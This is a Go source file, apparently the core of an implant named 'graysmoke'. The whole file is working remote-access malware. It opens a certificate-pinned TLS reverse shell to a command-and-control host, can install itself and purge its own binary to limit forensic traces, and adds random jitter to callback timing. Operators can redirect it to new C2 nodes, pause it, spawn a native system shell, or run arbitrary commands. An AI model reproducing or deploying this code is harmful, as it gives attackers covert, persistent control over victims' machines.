//go:generate goversioninfo

package main

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"errors"
	"log"
	"math"
	"math/rand"
	"net"
	"os" // requirement to access to GOOS
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/schwartz1375/graysmoke/installer"
	"github.com/schwartz1375/graysmoke/shell"
)

var (
	connectString string
	purge         string //bool
	delay         string //int
	fingerPrint   string
	install       string //bool
	jitter        = 13
	callBackDelay = 0
	newC2node     = ""
)

func main() {
	//Need to add err for the _ vars below
	delayTime, _ := strconv.Atoi(delay)
	purgeSetting, _ := strconv.ParseBool(purge)
	installFile, _ := strconv.ParseBool(install)
	time.Sleep(time.Duration(delayTime) * time.Second)
	if purgeSetting {
		err := installer.SetPurge(os.Args[0])
		if err != nil {
			log.Println("WARNING: failure to defer purge")
			if runtime.GOOS == "windows" {
				log.Println("Prefetch will be created (C:\\Windows\\Prefetch)!")
			}
		}
	}
	if installFile {
		if err := installer.Install(); err != nil {
			log.Println("WARNING: " + os.Args[0] + " maybe left on disk")
			log.Println("Aw Snap, error: ", err)
			os.Exit(1)
		}
	}
	//Cleanup fingerprint
	fprint := strings.Replace(fingerPrint, ":", "", -1)
	bytesFingerprint, err := hex.DecodeString(fprint)
	if err != nil {
		log.Println("WARNING: " + os.Args[0] + " maybe left on disk")
		log.Println("Aw Snap, decode error: ", err)
		os.Exit(1)
	}
	for {
		if newC2node != "" {
			connectString = newC2node
		}
		callBackDelay, newC2node, err = ReverseShell(connectString, bytesFingerprint)
		if err != nil {
			log.Println("WARNING: " + os.Args[0] + " maybe left on disk")
			log.Println("Aw Snap, error: ", err)
			os.Exit(1)
		}
		if callBackDelay > 0 {
			time.Sleep(time.Duration(callBackDelay) * time.Second)
		}
	}
}

//ExecShell get shell prompt
func ExecShell(conn net.Conn) {
	//var cmd *exec.Cmd = shell.GetShell()
	var cmd = shell.GetShell()
	//Take advantage of read/write interfaces to tie inputs/outputs
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

//ReverseShell enalbes a TCP reverse shell
func ReverseShell(host string, fingerprint []byte) (int, string, error) {
	callBackDelay = 0
	newC2node := ""
	tlsConfig := &tls.Config{
		InsecureSkipVerify:       true,
		MinVersion:               tls.VersionTLS12,
		CurvePreferences:         []tls.CurveID{tls.CurveP521, tls.CurveP384, tls.CurveP256},
		PreferServerCipherSuites: true,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
			tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_RSA_WITH_AES_256_CBC_SHA,
		},
	}
	remoteConn, err := tls.Dial("tcp", host, tlsConfig)
	if err != nil {
		//log.Fatal("Error connecting. ", err)
		return callBackDelay, newC2node, err
	}
	defer remoteConn.Close()
	//log.Println("Connection established. Lauching shell...")
	/*
		if err := remoteConn.VerifyHostname; err != nil {
			log.Println("WARNING!!! Failed when checking that the peer certificate chain is valid for connecting to host")
			log.Println("WARNING: " + os.Args[0] + " maybe left on disk")
			os.Exit(1)
		}
	*/
	ok := CertFingerPrintCheck(remoteConn, fingerprint)
	if !ok {
		return callBackDelay, newC2node, errors.New("failed fringerprint check")
	}
	callBackDelay, newC2node := InteractiveShell(remoteConn)
	return callBackDelay, newC2node, err
}

//CertFingerPrintCheck Check the state of cert pinning
func CertFingerPrintCheck(remoteConn *tls.Conn, fingerprint []byte) bool {
	valid := false
	connState := remoteConn.ConnectionState()
	certs := connState.PeerCertificates
	if len(certs) < 1 {
		//log.Println("no TLS peer certificates")
		return valid
	}
	for _, peerCert := range certs {
		hash := sha256.Sum256(peerCert.Raw)
		//log.Println(hash)
		/*if bytes.Compare(hash[0:], fingerprint) == 0 {
			valid = true
		}*/
		valid = bytes.Equal(hash[0:], fingerprint)
	}
	return valid
}

//AddJitter is used to generate random number
func AddJitter(jitter int) int {
	rand.Seed(time.Now().UnixNano())
	randJitter := rand.Intn(jitter)
	if randJitter%2 == 0 {
		//randJitter is Even number
		return randJitter
	}
	//randJitter is Odd number
	return randJitter * -1
}

//InteractiveShell start a inter active shell
func InteractiveShell(conn net.Conn) (int, string) {
	var (
		exit          = false
		prompt        = "[GShell]> "
		scanner       = bufio.NewScanner(conn)
		newC2node     = ""
		callBackDelay = 0
	)
	conn.Write([]byte(prompt))
	for scanner.Scan() {
		command := scanner.Text()
		if len(command) > 1 {
			argv := strings.Split(command, " ")
			switch argv[0] {
			case "exit":
				exit = true
			case "callback":
				if len(argv) < 2 {
					conn.Write([]byte("Invaild callback, usage:  callback [server:port] sleep [delay in seconds]\n"))
					exit = false
					break
				}
				if len(argv) > 4 {
					conn.Write([]byte("Invaild callback, usage:  callback [server:port] sleep [delay in seconds]\n"))
					exit = false
					break
				}
				if len(argv) == 2 {
					newC2node = argv[1]
					conn.Write([]byte("Will call you back on: " + argv[1] + " in " + strconv.Itoa(callBackDelay) + " seconds\n"))
					exit = true
					break
				}
				if len(argv) == 4 {
					if argv[2] == "sleep" {
						delay, err := strconv.Atoi(argv[3])
						if err != nil {
							conn.Write([]byte("Invaild sleep time, usage:  sleep [# of seconds]\n"))
							exit = false
							break
						}
						callBackDelay = delay
						newC2node = argv[1]
						jitterDelay := AddJitter(jitter)
						callBackDelay = int(math.Abs(float64(callBackDelay + jitterDelay)))
						conn.Write([]byte("Will call you back on: " + argv[1] + " in " + strconv.Itoa(callBackDelay) + " seconds\n"))
						exit = true
						break
					} else {
						conn.Write([]byte("Invaild callback, usage:  callback [server:port] sleep [delay in seconds]\n"))
						exit = false
						break
					}
				} else {
					conn.Write([]byte("Invaild callback, usage:  callback [server:port] sleep [delay in seconds]\n"))
					exit = false
					break
				}

			case "run_shell":
				conn.Write([]byte("Enjoy your native shell\n"))
				ExecShell(conn)
			case "sleep":
				if len(argv) < 2 {
					conn.Write([]byte("Invaild sleep time, usage:  sleep [# of seconds]\n"))
					exit = false
					break
				}
				delay, err := strconv.Atoi(argv[1])
				if err != nil {
					conn.Write([]byte("Invaild sleep time, usage:  sleep [# of seconds]\n"))
					exit = false
					break
				}
				callBackDelay = delay
				if delay <= 0 {
					conn.Write([]byte("Please enter a number grater than zero:  sleep [# of seconds]\n"))
					exit = false
					break
				}
				exit = true
				jitterDelay := AddJitter(jitter)
				callBackDelay = int(math.Abs(float64(callBackDelay + jitterDelay)))
				conn.Write([]byte("Closing network session for " + strconv.Itoa(callBackDelay) + " seconds\n"))
			case "help":
				conn.Write([]byte("Built in funcations:" +
					"\nrun_shell - drops you a system shell" +
					"\nsleep - Closing network session for requested time " +
					"\ncallback - Calls you back on C2 node, syntax: callback [server:port] OR callback [server:port] sleep [delay in seconds]" +
					"\nexit - clean exit\n"))
			default:
				shell.ExecuteCmd(command, conn)
			}
			if exit {
				break
			}
		}
		conn.Write([]byte(prompt))
	}
	return callBackDelay, newC2node
}
